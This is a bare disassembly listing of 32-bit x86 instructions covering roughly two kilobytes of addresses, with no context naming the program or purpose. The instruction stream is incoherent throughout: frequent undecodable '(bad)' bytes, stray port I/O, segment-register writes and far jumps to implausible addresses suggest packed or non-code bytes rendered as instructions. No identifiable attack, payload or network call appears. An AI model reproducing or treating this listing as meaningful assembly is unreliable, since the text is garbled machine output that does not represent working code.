  41f2a6:	rol    DWORD PTR [edx+0x40],1
  41f2a9:	sbb    eax,0x6ef3fc09
  41f2ae:	add    al,0x6e
  41f2b0:	inc    ebp
  41f2b1:	out    dx,al
  41f2b2:	dec    edx
  41f2b3:	ja     0x41f32b
  41f2b5:	mov    dh,0x76
  41f2b7:	in     al,dx
  41f2b8:	dec    ecx
  41f2b9:	out    0xa3,al
  41f2bb:	or     eax,0xdd67d84a
  41f2c0:	mov    edi,DWORD PTR [esi+0x11285406]
  41f2c6:	jb     0x41f33b
  41f2c8:	sbb    dh,BYTE PTR [esi+0x4ce2379c]
  41f2ce:	push   edi
  41f2cf:	pop    ds
  41f2d0:	out    0x9f,al
  41f2d2:	fst    QWORD PTR [ebx+0x9]
  41f2d5:	mov    eax,ds:0x70056352
  41f2da:	into   
  41f2db:	mov    edx,DWORD PTR [ecx+ebx*2]
  41f2de:	jle    0x41f317
  41f2e0:	shr    BYTE PTR [ebx+0x55],cl
  41f2e3:	pop    edx
  41f2e4:	sbb    ah,BYTE PTR [eax-0x15]
  41f2e7:	lahf   
  41f2e8:	loopne 0x41f331
  41f2ea:	pushw  0xff88
  41f2ed:	dec    edi
  41f2ee:	xchg   ebp,eax
  41f2ef:	aas    
  41f2f0:	mov    ecx,0x2325a072
  41f2f5:	imul   edi,DWORD PTR [eax+0x69],0xec0239c0
  41f2fc:	push   0xe7158fd7
  41f301:	call   0x5f0ed856
  41f306:	pop    eax
  41f307:	add    eax,0xd96409a8
  41f30c:	pop    ecx
  41f30d:	cld    
  41f30e:	sbb    esi,DWORD PTR [edx+0x76]
  41f311:	scas   eax,DWORD PTR es:[edi]
  41f312:	cmp    al,0x23
  41f314:	out    dx,eax
  41f315:	(bad)  
  41f316:	mov    ah,0xea
  41f318:	jge    0x41f399
  41f31a:	or     DWORD PTR [ebp+0x33072bb7],eax
  41f320:	jle    0x41f323
  41f322:	push   ds
  41f323:	push   ebx
  41f324:	inc    eax
  41f325:	sub    BYTE PTR [esi+0x107428f6],al
  41f32b:	in     eax,0x75
  41f32d:	(bad)  
  41f32e:	cmp    DWORD PTR [ebp-0x1f4a99d6],edi
  41f334:	(bad)  
  41f335:	push   eax
  41f336:	int3   
  41f337:	sub    eax,0x46b50771
  41f33c:	jbe    0x41f2f2
  41f33e:	fcmovnb st,st(6)
  41f340:	stos   DWORD PTR es:[edi],eax
  41f341:	sub    ecx,eax
  41f343:	xchg   ebp,eax
  41f344:	je     0x41f340
  41f346:	les    edx,FWORD PTR [ebx+0x3d]
  41f349:	jno    0x41f2ed
  41f34b:	add    DWORD PTR [ecx+0x48513644],esi
  41f351:	dec    eax
  41f352:	cmp    al,0x75
  41f354:	push   esp
  41f355:	paddusb mm1,QWORD PTR [esi+0x3d7b3344]
  41f35c:	scas   eax,DWORD PTR es:[edi]
  41f35d:	mov    esp,DWORD PTR [ebx+esi*2]
  41f360:	adc    al,0x17
  41f362:	lods   eax,DWORD PTR ds:[esi]
  41f363:	jb     0x41f3d2
  41f365:	jge    0x41f399
  41f367:	(bad)  
  41f368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f369:	lods   eax,DWORD PTR ds:[esi]
  41f36a:	jmp    FWORD PTR [edx]
  41f36c:	pop    ebp
  41f36d:	xchg   ebp,eax
  41f36e:	jg     0x41f3df
  41f370:	in     al,0x4d
  41f372:	mov    esi,0x2c102f64
  41f377:	add    al,0x20
  41f379:	call   0x99d2:0x8f43bbe6
  41f380:	mov    WORD PTR [ebx-0x13],gs
  41f383:	ja     0x41f374
  41f385:	aas    
  41f386:	mov    al,ds:0xbbd0170a
  41f38b:	xchg   ebp,eax
  41f38c:	test   BYTE PTR [eax-0x1d5d2b5a],al
  41f392:	mov    ecx,0x5fd7e8da
  41f397:	out    dx,al
  41f398:	or     esi,edx
  41f39a:	mov    cs,WORD PTR [eax+eiz*1]
  41f39d:	mov    edi,0xf863aeb4
  41f3a2:	add    DWORD PTR [ebx+0x76],0x79
  41f3a6:	inc    edx
  41f3a7:	mov    ss,ebx
  41f3a9:	and    DWORD PTR [ebp+0x2f6f651],edx
  41f3af:	lods   eax,DWORD PTR ds:[esi]
  41f3b0:	cdq    
  41f3b1:	add    DWORD PTR [edx+0x54],ebp
  41f3b4:	lahf   
  41f3b5:	push   edx
  41f3b6:	fcom   QWORD PTR [ebx+0x422ad7bf]
  41f3bc:	add    edi,edi
  41f3be:	leave  
  41f3bf:	pop    ebp
  41f3c0:	cmp    al,0xd9
  41f3c2:	repnz fisub DWORD PTR [eax-0x59e788c8]
  41f3c9:	push   esp
  41f3ca:	outs   dx,DWORD PTR ds:[esi]
  41f3cb:	dec    ebp
  41f3cc:	push   ecx
  41f3cd:	adc    esp,DWORD PTR [ecx]
  41f3cf:	(bad)  
  41f3d0:	adc    eax,0x22e8f049
  41f3d5:	xor    ebp,DWORD PTR [edx]
  41f3d7:	add    eax,0xdf130a8f
  41f3dc:	add    dl,BYTE PTR ds:0x6822564d
  41f3e2:	es pop edi
  41f3e4:	sub    eax,0xc9db6da8
  41f3e9:	out    0xa4,eax
  41f3eb:	cs mov ah,0xed
  41f3ee:	fldln2 
  41f3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f1:	jg     0x41f393
  41f3f3:	dec    ecx
  41f3f4:	cmp    ebp,DWORD PTR [edi-0x1f3ed8de]
  41f3fa:	push   esi
  41f3fb:	or     ah,BYTE PTR [edx-0x69]
  41f3fe:	scas   al,BYTE PTR es:[edi]
  41f3ff:	jo     0x41f44c
  41f401:	xor    DWORD PTR [ecx-0x163e68f6],edx
  41f407:	fadd   st(5),st
  41f409:	popf   
  41f40a:	xor    ebp,DWORD PTR [edi+0x36]
  41f40d:	xchg   esp,eax
  41f40e:	lock mov edi,DWORD PTR [ebx+0x3973f73b]
  41f415:	dec    edi
  41f416:	add    al,0xd0
  41f418:	iret   
  41f419:	jg     0x41f418
  41f41b:	and    eax,0x9715d97a
  41f420:	dec    edx
  41f421:	mov    ds:0x8c65d0a6,eax
  41f426:	sub    cl,bh
  41f428:	jo     0x41f46a
  41f42a:	push   ds
  41f42b:	xchg   esi,eax
  41f42c:	icebp  
  41f42d:	mov    ebp,0x1121040f
  41f432:	sbb    edi,0x56d409e6
  41f438:	out    0xf0,al
  41f43a:	out    dx,eax
  41f43b:	xchg   ebx,eax
  41f43c:	out    dx,al
  41f43d:	sbb    al,0xe
  41f43f:	push   ebp
  41f440:	out    dx,eax
  41f441:	dec    esi
  41f442:	call   0x886f0b6c
  41f447:	aad    0xd9
  41f449:	repnz out dx,eax
  41f44b:	inc    ecx
  41f44d:	add    eax,0xc0fb8c28
  41f452:	lock sbb DWORD PTR [esi],ecx
  41f455:	test   BYTE PTR [ecx],bl
  41f457:	mov    al,0xd9
  41f459:	aaa    
  41f45a:	xchg   ebx,eax
  41f45b:	pop    es
  41f45c:	jle    0x41f4bf
  41f45e:	jbe    0x41f40d
  41f460:	cmp    eax,0x75a8095c
  41f465:	sahf   
  41f466:	sub    al,0x15
  41f468:	jnp    0x41f499
  41f46a:	push   ebx
  41f46b:	mov    WORD PTR [edi-0x19ce2e4c],ss
  41f471:	out    0x88,al
  41f473:	pop    ds
  41f474:	push   ebp
  41f475:	or     eax,0xb6724eb7
  41f47a:	jg     0x41f482
  41f47c:	cmc    
  41f47d:	in     eax,dx
  41f47e:	test   edi,edx
  41f480:	mov    al,ds:0xdfd8e984
  41f485:	ret    
  41f486:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41f488:	cwde   
  41f489:	mov    bh,BYTE PTR [edi]
  41f48b:	push   ebp
  41f48c:	sub    ebx,ebx
  41f48e:	jo     0x41f417
  41f490:	ins    BYTE PTR es:[edi],dx
  41f491:	outs   dx,DWORD PTR ds:[esi]
  41f492:	push   ecx
  41f493:	jo     0x41f427
  41f495:	ficomp WORD PTR [ecx]
  41f497:	push   edx
  41f498:	or     eax,0x8d6abbf7
  41f49d:	push   DWORD PTR [ebx-0x1d]
  41f4a0:	popa   
  41f4a1:	not    DWORD PTR [esi]
  41f4a3:	test   DWORD PTR [edx-0x634da68b],eax
  41f4a9:	sbb    DWORD PTR [edx+esi*4-0x4a5a576d],edi
  41f4b0:	popa   
  41f4b1:	ficomp WORD PTR [ecx]
  41f4b3:	mov    ebx,0x3f1af56e
  41f4b8:	ret    0xeb3b
  41f4bb:	sbb    dh,BYTE PTR [ebp+0x2260f48]
  41f4c1:	ror    DWORD PTR [eax-0x29c48bae],1
  41f4c7:	sahf   
  41f4c8:	jnp    0x41f4b2
  41f4ca:	in     al,dx
  41f4cb:	icebp  
  41f4cc:	imul   ecx,DWORD PTR [ecx],0xb699e0de
  41f4d2:	bound  esp,QWORD PTR [ebp+edi*8-0x5d]
  41f4d6:	push   ebp
  41f4d7:	neg    ah
  41f4d9:	dec    ebx
  41f4da:	and    al,0x4d
  41f4dc:	dec    esi
  41f4dd:	bound  ecx,QWORD PTR [edi+edx*1+0x36]
  41f4e1:	or     ebp,ecx
  41f4e3:	dec    esi
  41f4e4:	xchg   ecx,eax
  41f4e5:	sbb    eax,0x4dbf9ad7
  41f4ea:	jmp    0x80ba8df9
  41f4ef:	jg     0x41f4e6
  41f4f1:	mov    ah,0xf
  41f4f3:	scas   eax,DWORD PTR es:[edi]
  41f4f4:	mov    eax,ds:0x6cb0f03d
  41f4f9:	ret    
  41f4fa:	ja     0x41f50d
  41f4fc:	mov    esi,0xeeba2864
  41f501:	push   edi
  41f502:	(bad)  
  41f503:	jo     0x41f57b
  41f505:	out    0x7d,eax
  41f507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f508:	push   0xcde18843
  41f50d:	xchg   esp,eax
  41f50e:	sbb    edx,DWORD PTR [ecx]
  41f510:	mov    eax,ds:0xfeeedbca
  41f515:	sub    eax,0xb1f57fcc
  41f51a:	(bad)  [edx+0x2c82c266]
  41f520:	xchg   edx,eax
  41f521:	jmp    0x977d:0x3450e6e
  41f528:	jo     0x41f500
  41f52a:	sub    eax,DWORD PTR [esp+eiz*8+0x29]
  41f52e:	gs xchg edi,eax
  41f530:	mov    WORD PTR [eax-0x4ec783bf],fs
  41f536:	stos   DWORD PTR es:[edi],eax
  41f537:	in     eax,0x8
  41f539:	mov    dh,0x18
  41f53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f53c:	shl    DWORD PTR [ebx-0x2bd5f485],1
  41f542:	sbb    DWORD PTR [ebx-0x13441e87],eax
  41f548:	sbb    DWORD PTR [edx],edi
  41f54a:	jg     0x41f5ac
  41f54c:	jno    0x41f539
  41f54e:	xchg   ecx,eax
  41f54f:	add    eax,0xbace8367
  41f554:	sbb    al,0xe7
  41f556:	scas   eax,DWORD PTR es:[edi]
  41f557:	mov    al,0x65
  41f559:	push   edi
  41f55a:	shl    BYTE PTR [ebp-0x3a03abaf],cl
  41f560:	fs jns 0x41f5e0
  41f563:	pop    es
  41f564:	test   DWORD PTR [edi],esi
  41f566:	stc    
  41f567:	mov    cl,0x78
  41f569:	xchg   edi,eax
  41f56a:	fdiv   st(5),st
  41f56c:	jbe    0x41f533
  41f56e:	push   ecx
  41f56f:	dec    ecx
  41f570:	xchg   edx,eax
  41f571:	add    al,0x58
  41f573:	outs   dx,DWORD PTR ds:[esi]
  41f574:	sbb    DWORD PTR [ebx-0x29],ecx
  41f577:	in     al,0x1e
  41f579:	arpl   WORD PTR ds:[ecx+esi*1],cx
  41f57d:	(bad)  
  41f57e:	add    al,BYTE PTR cs:[edx-0x6b]
  41f582:	iret   
  41f583:	das    
  41f584:	test   eax,0xba5f5e18
  41f589:	je     0x41f50c
  41f58b:	jae    0x41f5a2
  41f58d:	cmp    esp,DWORD PTR [eax]
  41f58f:	data16 add al,0xce
  41f592:	pusha  
  41f593:	cld    
  41f594:	addr16 push esi
  41f596:	sub    DWORD PTR ds:0x389b14c3,ebp
  41f59c:	or     edx,ecx
  41f59e:	adc    eax,0x7032697e
  41f5a3:	retf   0x7e5f
  41f5a6:	ds push 0xb44b287c
  41f5ac:	fldenv [eax+0x1ecdc5ed]
  41f5b2:	xor    BYTE PTR [ecx],0x95
  41f5b5:	cmp    BYTE PTR [edi],ch
  41f5b7:	loop   0x41f5e6
  41f5b9:	xor    BYTE PTR [ecx],dl
  41f5bb:	jge    0x41f5bf
  41f5bd:	in     al,dx
  41f5be:	imul   esi,DWORD PTR [esi-0x2747de05],0xffffffc8
  41f5c5:	xor    bh,BYTE PTR [eax]
  41f5c7:	imul   edx,DWORD PTR [edi+0x38ff107e],0xfffffff9
  41f5ce:	lods   eax,DWORD PTR ds:[esi]
  41f5cf:	pop    eax
  41f5d0:	add    edx,DWORD PTR [edx+0xf86ce8a]
  41f5d6:	enter  0xffeb,0x43
  41f5da:	push   0xc997a82f
  41f5df:	mov    cl,0xb1
  41f5e1:	xchg   ebp,eax
  41f5e2:	adc    DWORD PTR [esi],ecx
  41f5e4:	cdq    
  41f5e5:	iret   
  41f5e6:	jo     0x41f5f3
  41f5e8:	cmp    al,0x3
  41f5ea:	dec    ecx
  41f5eb:	mov    ecx,0xf5865978
  41f5f0:	popa   
  41f5f1:	pop    eax
  41f5f2:	daa    
  41f5f3:	lods   al,BYTE PTR ds:[esi]
  41f5f4:	xor    BYTE PTR [edx-0x4bc40dbc],cl
  41f5fa:	push   0xffffff81
  41f5fc:	inc    ecx
  41f5fd:	fisttp QWORD PTR [ebx+0x2e]
  41f600:	fmul   st,st(6)
  41f602:	jp     0x41f5f9
  41f604:	lahf   
  41f605:	inc    ebp
  41f606:	or     bl,cl
  41f608:	mov    esi,0xe67f3f91
  41f60d:	int3   
  41f60e:	push   edx
  41f60f:	test   eax,0xbfea5936
  41f614:	clc    
  41f615:	pushf  
  41f616:	sub    DWORD PTR [ebp-0x1c],0x34
  41f61a:	pop    eax
  41f61b:	and    edi,edi
  41f61d:	pop    ds
  41f61e:	mov    dh,0x23
  41f620:	rol    DWORD PTR [edi-0x2651fe5c],0xcc
  41f627:	push   DWORD PTR [edi+0x54696f73]
  41f62d:	pop    esp
  41f62e:	loopne 0x41f682
  41f630:	test   bh,dh
  41f632:	cmp    dl,BYTE PTR [ebp-0x6c]
  41f635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f636:	add    esp,edi
  41f638:	cmp    ebx,DWORD PTR [edx]
  41f63a:	jmp    0x2584:0x2c503120
  41f641:	inc    edx
  41f642:	dec    ecx
  41f643:	gs aas 
  41f645:	enter  0x2b66,0x92
  41f649:	dec    esi
  41f64a:	sbb    al,0x72
  41f64c:	jb     0x41f6a8
  41f64e:	mov    edi,0xabd0f3d7
  41f653:	shr    DWORD PTR ds:0x5df4d8d6,cl
  41f659:	shl    BYTE PTR [esi+0x66685394],1
  41f65f:	dec    esp
  41f660:	add    ecx,DWORD PTR [ecx-0x44]
  41f663:	mov    esi,0xbb837ee6
  41f668:	sbb    cl,BYTE PTR [edi]
  41f66a:	mov    bh,0x1d
  41f66c:	arpl   WORD PTR [edx+0x14],sp
  41f66f:	inc    eax
  41f670:	fcomp  DWORD PTR [edi+0x1b]
  41f673:	and    eax,0x387809be
  41f678:	icebp  
  41f679:	mov    esp,0x36f16f79
  41f67e:	cmp    al,0xec
  41f680:	nop
  41f681:	add    edi,DWORD PTR [eax-0x5c2e15ee]
  41f687:	shr    eax,1
  41f689:	xchg   DWORD PTR [edi-0x30],esi
  41f68c:	push   ebx
  41f68d:	or     BYTE PTR [edx],dh
  41f68f:	(bad)  
  41f690:	cmp    dh,BYTE PTR [eax+0x115a7c6f]
  41f696:	or     al,0x92
  41f699:	mov    ebp,0x8df6fe66
  41f69e:	xor    al,0xad
  41f6a1:	mov    esi,0x75902e05
  41f6a6:	inc    ebp
  41f6a7:	stos   DWORD PTR es:[edi],eax
  41f6a8:	mov    ds:0x265c2f0e,eax
  41f6ad:	mov    eax,0x8e05e25b
  41f6b2:	xchg   BYTE PTR [eax+0x2dba92d],cl
  41f6b8:	xor    eax,0x5655a04e
  41f6bd:	mov    al,ds:0x900cc622
  41f6c2:	mov    eax,0x2d86a03b
  41f6c7:	not    DWORD PTR [ebx]
  41f6c9:	jne    0x41f6e0
  41f6cb:	adc    BYTE PTR [ebp-0x5351c722],dh
  41f6d1:	fisub  DWORD PTR [eax+eax*4+0x2e]
  41f6d5:	dec    esi
  41f6d6:	scas   al,BYTE PTR es:[edi]
  41f6d7:	push   0x5d
  41f6d9:	dec    esp
  41f6da:	out    dx,eax
  41f6db:	xchg   esp,eax
  41f6dc:	mov    al,0xc1
  41f6de:	pop    ebp
  41f6df:	cmp    bh,BYTE PTR ds:0x7c016f23
  41f6e5:	mov    ds:0xf0073847,eax
  41f6ea:	iret   
  41f6eb:	imul   esi,ebp,0x107f36be
  41f6f1:	pop    eax
  41f6f2:	pop    esi
  41f6f3:	dec    ecx
  41f6f4:	ins    DWORD PTR es:[edi],dx
  41f6f5:	into   
  41f6f6:	hlt    
  41f6f7:	(bad)  
  41f6f8:	cld    
  41f6f9:	retf   
  41f6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6fb:	sub    al,0x92
  41f6fd:	jle    0x41f6c1
  41f6ff:	xchg   esi,eax
  41f700:	aaa    
  41f701:	xchg   DWORD PTR [ecx-0x5f],eax
  41f704:	into   
  41f705:	and    ch,0xec
  41f708:	aam    0x28
  41f70a:	xchg   ebp,eax
  41f70b:	fistp  DWORD PTR [edx-0x10]
  41f70e:	inc    edx
  41f70f:	retf   0x289a
  41f712:	aam    0x28
  41f714:	out    dx,eax
  41f715:	cmp    al,0x2e
  41f717:	(bad)  
  41f719:	bound  edx,QWORD PTR [edi-0x6c8d36e9]
  41f71f:	dec    esp
  41f720:	mov    eax,ds:0x461a5f22
  41f725:	mov    cs,WORD PTR [edx-0x6ef1cfaa]
  41f72b:	shl    esp,cl
  41f72d:	lds    ebx,FWORD PTR [edx+ecx*1+0x3a]
  41f731:	or     ah,BYTE PTR [ebx]
  41f733:	fild   QWORD PTR [ebx]
  41f735:	fmul   DWORD PTR [ebx]
  41f737:	jno    0x41f791
  41f739:	loopne 0x41f727
  41f73b:	pop    edx
  41f73c:	shl    DWORD PTR [eax+0x6444eda0],cl
  41f742:	push   es
  41f743:	push   edx
  41f744:	std    
  41f745:	pop    ds
  41f746:	cld    
  41f747:	mov    esi,0x4c591edc
  41f74c:	mov    ds:0xd9c74042,eax
  41f751:	add    BYTE PTR [esi],dl
  41f753:	cld    
  41f754:	out    0xf7,eax
  41f756:	adc    eax,0x228d53
  41f75b:	sahf   
  41f75c:	out    0x60,al
  41f75e:	adc    esi,DWORD PTR [eax-0x3af65315]
  41f764:	icebp  
  41f765:	xchg   BYTE PTR [edi+0x28],cl
  41f768:	into   
  41f769:	adc    eax,0x5c1d1d3d
  41f76e:	daa    
  41f76f:	in     al,0xea
  41f771:	sbb    ah,BYTE PTR [esi+0x7e]
  41f774:	sbb    ax,0x958
  41f778:	or     al,0x94
  41f77a:	mov    al,ds:0x27c327d
  41f77f:	repnz and al,BYTE PTR [esi-0x39]
  41f783:	lds    ecx,FWORD PTR [edx-0x45]
  41f786:	scas   al,BYTE PTR es:[edi]
  41f787:	jle    0x41f7e6
  41f789:	cmp    ecx,DWORD PTR [ecx-0x5a7b5f83]
  41f78f:	out    0x74,eax
  41f791:	dec    esp
  41f792:	dec    ebx
  41f793:	ds xor eax,0xbc5a0163
  41f799:	sbb    ebx,DWORD PTR [edx+0x6540eb3d]
  41f79f:	mov    ch,0x62
  41f7a1:	xchg   BYTE PTR [eax],bh
  41f7a3:	sub    al,0x53
  41f7a5:	fldcw  WORD PTR [ecx]
  41f7a7:	stos   BYTE PTR es:[edi],al
  41f7a8:	rcl    dl,0x3d
  41f7ab:	(bad)  
  41f7ac:	inc    esi
  41f7ad:	sub    esi,DWORD PTR [edx+edi*4]
  41f7b0:	(bad)  
  41f7b1:	clc    
  41f7b2:	cmp    DWORD PTR ds:0xd4293a21,ebp
  41f7b8:	or     dh,BYTE PTR [ebp-0x74]
  41f7bb:	sbb    DWORD PTR [eax],eax
  41f7bd:	leave  
  41f7be:	aas    
  41f7bf:	loop   0x41f771
  41f7c1:	pop    esi
  41f7c2:	dec    ebx
  41f7c3:	and    bl,BYTE PTR [ebp+0x23be1c7b]
  41f7c9:	pop    edi
  41f7ca:	icebp  
  41f7cb:	inc    edx
  41f7cc:	nop
  41f7cd:	mov    al,0x5d
  41f7cf:	(bad)  
  41f7d0:	fs mov dh,0x4d
  41f7d3:	inc    ecx
  41f7d4:	pop    eax
  41f7d5:	inc    ebp
  41f7d6:	jb     0x41f7f0
  41f7d8:	inc    ebp
  41f7d9:	jbe    0x41f822
  41f7db:	mov    ebx,0xa36a32a
  41f7e0:	xlat   BYTE PTR ds:[ebx]
  41f7e1:	xor    al,0xf2
  41f7e3:	or     BYTE PTR [edi],0x6e
  41f7e6:	into   
  41f7e7:	and    edx,edx
  41f7e9:	fs ja  0x41f834
  41f7ec:	mov    ebx,0xad1c9b3f
  41f7f1:	lods   eax,DWORD PTR ds:[esi]
  41f7f2:	add    cl,bh
  41f7f4:	and    DWORD PTR [ebx-0x70],0xffffff81
  41f7f8:	fadd   st(4),st
  41f7fa:	mov    es,WORD PTR [ebp-0x2787c764]
  41f800:	ror    DWORD PTR [eax-0x57],cl
  41f803:	add    edi,edx
  41f805:	stos   BYTE PTR es:[edi],al
  41f806:	xor    al,0x64
  41f808:	mov    cl,0xc2
  41f80a:	ret    
  41f80b:	je     0x41f790
  41f80d:	cmp    ebp,esi
  41f80f:	js     0x41f849
  41f811:	imul   edi,ebp,0x2a54f6f1
  41f817:	bound  ebp,QWORD PTR [ebp-0x77]
  41f81a:	fidiv  DWORD PTR [edx-0x38]
  41f81d:	xor    bh,BYTE PTR [edi+esi*4-0x6c]
  41f821:	push   esi
  41f822:	mov    bx,0x2d94
  41f826:	cdq    
  41f827:	cs test eax,0x204d229
  41f82d:	mov    ecx,0xacbd3b68
  41f832:	dec    ebp
  41f833:	js     0x41f85a
  41f835:	dec    edi
  41f836:	mov    bh,0xbe
  41f838:	jmp    0x41f864
  41f83a:	mov    al,ds:0x89c3ea4f
  41f83f:	je     0x41f866
  41f841:	push   esp
  41f842:	icebp  
  41f843:	and    cl,BYTE PTR [ebp-0x26]
  41f846:	xchg   edx,eax
  41f847:	inc    ebx
  41f848:	test   BYTE PTR [eax-0x50ffa5df],dh
  41f84e:	and    eax,0x8334594
  41f853:	mov    dh,0x11
  41f855:	pop    esp
  41f856:	or     eax,0x5afc66a9
  41f85b:	add    bl,BYTE PTR [ecx]
  41f85d:	ja     0x41f7ed
  41f85f:	add    cl,BYTE PTR [ecx+0x7]
  41f862:	loopne 0x41f894
  41f864:	mov    edx,0xaf587826
  41f869:	adc    eax,0x1adae06d
  41f86e:	stos   BYTE PTR es:[edi],al
  41f86f:	(bad)  
  41f870:	ins    DWORD PTR es:[edi],dx
  41f871:	jno    0x41f831
  41f873:	or     bl,cl
  41f875:	dec    eax
  41f876:	leave  
  41f877:	pop    ecx
  41f878:	inc    edx
  41f879:	and    esp,DWORD PTR [edi+0x622c5d3a]
  41f87f:	and    esi,ecx
  41f881:	fcomp  QWORD PTR [esi]
  41f883:	jle    0x41f8b6
  41f885:	ror    DWORD PTR [eax+0x5e],cl
  41f888:	add    eax,0x11260956
  41f88d:	(bad)  
  41f88e:	sub    al,0x79
  41f890:	ins    BYTE PTR es:[edi],dx
  41f891:	(bad)  
  41f892:	aad    0xbf
  41f894:	and    ebp,DWORD PTR [edx+0x29]
  41f897:	dec    ebp
  41f898:	bound  ecx,QWORD PTR [esi-0x44]
  41f89b:	push   cs
  41f89c:	pushf  
  41f89d:	retf   0x3032
  41f8a0:	pop    ecx
  41f8a1:	adc    cl,dh
  41f8a3:	pop    esp
  41f8a4:	mov    esp,0xf89cf5a4
  41f8a9:	or     eax,DWORD PTR [esi+0x3]
  41f8ac:	fbstp  TBYTE PTR [edi]
  41f8ae:	hlt    
  41f8af:	ss push ebp
  41f8b1:	int    0x22
  41f8b3:	mov    ebx,0xdda2816a
  41f8b8:	lods   al,BYTE PTR ds:[esi]
  41f8b9:	icebp  
  41f8ba:	mov    ds:0xe7067ea2,eax
  41f8bf:	test   al,0xa3
  41f8c1:	inc    ebx
  41f8c2:	in     al,0x68
  41f8c4:	xchg   edx,eax
  41f8c5:	push   0xffffffd0
  41f8c7:	xor    ch,0x55
  41f8ca:	push   edx
  41f8cb:	adc    DWORD PTR [ecx+0x43],esi
  41f8ce:	iret   
  41f8cf:	xor    al,0xc8
  41f8d1:	push   esp
  41f8d2:	(bad)  
  41f8d4:	adc    eax,0xfbf2cd5c
  41f8d9:	xchg   BYTE PTR [edx-0x639373bc],dh
  41f8df:	es push ecx
  41f8e1:	cmp    al,BYTE PTR [edx+0x58e8b6a8]
  41f8e7:	popf   
  41f8e8:	and    esi,edx
  41f8ea:	ins    DWORD PTR es:[edi],dx
  41f8eb:	sub    edi,DWORD PTR [edx+eax*1+0x5bc65f52]
  41f8f2:	iret   
  41f8f3:	sbb    edx,ebx
  41f8f5:	push   eax
  41f8f6:	jmp    FWORD PTR es:[edi]
  41f8f9:	fs out 0x59,al
  41f8fc:	cs in  al,dx
  41f8fe:	sub    cl,BYTE PTR ds:0x8be00d79
  41f904:	jno    0x41f94e
  41f906:	xchg   edx,eax
  41f907:	jo     0x41f970
  41f909:	and    BYTE PTR [eax+0x55f967e5],al
  41f90f:	mov    ds:0xb4671f32,eax
  41f914:	sub    dl,BYTE PTR [esi+ebp*8+0x6f340c65]
  41f91b:	lahf   
  41f91c:	call   0x1209588d
  41f921:	push   esi
  41f922:	dec    eax
  41f923:	or     al,0x3
  41f925:	mov    ah,0x8
  41f927:	jno    0x41f8cd
  41f929:	mov    fs,WORD PTR [ecx-0x3c0df550]
  41f92f:	jg     0x41f927
  41f931:	jns    0x41f8fb
  41f933:	adc    ebp,DWORD PTR [edi-0x4135fff7]
  41f939:	cmp    bh,cl
  41f93b:	cmc    
  41f93c:	ins    BYTE PTR es:[edi],dx
  41f93d:	(bad)  
  41f93e:	int    0x1d
  41f940:	shr    DWORD PTR [edx+0x50b60ee1],0xdd
  41f947:	cmp    DWORD PTR [edi-0x58],ecx
  41f94a:	cli    
  41f94b:	pop    esi
  41f94c:	add    ecx,ebx
  41f94e:	inc    eax
  41f94f:	enter  0xf3ec,0x43
  41f953:	aas    
  41f954:	mov    edx,0x1aa612e3
  41f959:	fst    st(6)
  41f95b:	and    al,BYTE PTR ds:[ebp-0x727e1f14]
  41f962:	mov    ebx,0xddad2c1c
  41f967:	lahf   
  41f968:	fcomi  st,st(7)
  41f96a:	sbb    eax,0x44ee9fe4
  41f96f:	lahf   
  41f970:	repz mov ah,0xce
  41f973:	push   0xc9c114d7
  41f978:	test   BYTE PTR ds:0x27dd60ce,dh
  41f97e:	(bad)  
  41f97f:	and    eax,0x5a53c925
  41f984:	stc    
  41f985:	mov    cl,0xad
  41f987:	mul    BYTE PTR [eax-0x3a]
  41f98a:	and    al,0x82
  41f98c:	adc    ah,bl
  41f98e:	jmp    0xf54fa1e
  41f993:	pusha  
  41f994:	xchg   esi,eax
  41f995:	out    dx,al
  41f996:	stos   DWORD PTR es:[edi],eax
  41f997:	inc    eax
  41f998:	arpl   WORD PTR [ecx+0x53411668],dx
  41f99e:	cmp    BYTE PTR [ecx-0x3],dl
  41f9a1:	mov    edi,0x8389aa6a
  41f9a6:	jmp    0xccea:0x6c803bb
  41f9ad:	(bad)  
  41f9ae:	mov    dh,0x49
  41f9b0:	loop   0x41f97e
  41f9b2:	mov    ch,bl
  41f9b4:	pop    ebp
  41f9b5:	out    dx,al
  41f9b6:	mov    ecx,0x5e6fa73a
  41f9bb:	cli    
  41f9bc:	push   0xffffff91
  41f9be:	leave  
  41f9bf:	xchg   ebx,eax
  41f9c0:	fisub  WORD PTR [edi-0x35ed3c6d]
  41f9c6:	sbb    DWORD PTR [esi-0x3b],edi
  41f9c9:	sub    eax,0x98b89053
  41f9ce:	mov    eax,0x96cca14f
  41f9d3:	in     al,0x81
  41f9d5:	sub    bl,BYTE PTR [edi-0x5b]
  41f9d8:	fst    QWORD PTR [esi-0x79c2ca6a]
  41f9de:	mov    eax,0x1520c313
  41f9e3:	aaa    
  41f9e4:	jno    0x41fa64
  41f9e6:	inc    edi
  41f9e7:	push   ds
  41f9e8:	stc    
  41f9e9:	shr    DWORD PTR [ecx+0x3],1
  41f9ec:	pop    ebx
  41f9ed:	hlt    
  41f9ee:	out    dx,al
  41f9ef:	in     al,0x3b
  41f9f1:	sub    ah,BYTE PTR [esi]
  41f9f3:	xor    DWORD PTR [edi-0x38],0x33
  41f9f7:	and    DWORD PTR [edi-0x6745d75b],0xf18549d3
  41fa01:	sbb    DWORD PTR [ebp-0x66],0x6d
  41fa05:	mov    ebx,0xf322c8bd
  41fa0a:	xchg   BYTE PTR [edx+0xf],cl
  41fa0d:	sub    DWORD PTR [esp+eax*1+0x300b1a5f],ecx
  41fa14:	jp     0x41f9a2
  41fa16:	pop    es
  41fa17:	neg    DWORD PTR [ebx-0x70b06789]
  41fa1d:	cmp    DWORD PTR [edx-0x261bde41],esp
  41fa23:	stos   DWORD PTR es:[edi],eax
  41fa24:	mov    dl,0x56
  41fa26:	lea    edi,[ecx-0x78136d9e]
  41fa2c:	call   0x96de1ace
  41fa31:	xor    DWORD PTR [edx-0x37545747],ecx
  41fa37:	fmul   st(0),st
  41fa39:	sbb    eax,0x6e5e87bc
  41fa3e:	ja     0x41f9ce
  41fa40:	or     cl,bh
  41fa42:	add    ebp,DWORD PTR [ebp+0x4]
  41fa45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
